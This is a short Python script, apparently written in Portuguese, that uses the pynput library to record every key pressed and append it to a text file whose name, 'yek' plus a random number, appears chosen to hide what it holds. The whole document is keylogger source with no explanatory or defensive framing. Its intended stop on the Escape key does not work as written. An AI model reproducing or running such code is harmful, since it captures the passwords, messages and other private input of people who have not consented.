from pynput.keyboard import Listener
import sys 
import random

numeros_log = random.randint(0,1000)
log = f'yek{numeros_log}.txt'
def escreve_key(key):
    with open (f'{log}','a') as file:
        file.write (f'{str(key)} \n s')
    if key == 'Key.esc':
        sys.exit()
with Listener (on_press=escreve_key) as logs :
    logs.join()